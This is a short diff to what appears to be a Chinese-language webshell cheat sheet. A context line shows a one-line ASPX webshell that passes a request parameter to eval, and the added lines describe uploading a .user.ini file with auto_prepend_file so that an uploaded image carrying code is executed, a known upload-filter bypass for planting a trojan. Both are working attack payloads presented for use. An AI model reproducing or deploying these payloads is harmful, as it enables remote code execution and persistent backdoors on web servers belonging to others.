@@ -43,5 +43,11 @@ aspx木马
 <%@ Page Language="Jscript"%><%eval(Request.Item["shell"],"unsafe");%>
 ```
 
+特殊：通过上传.user.ini内部增加文件自动包含进行传马攻击
+
+```
+Auto_prepend_file=2.jpg
+```
+
 
 
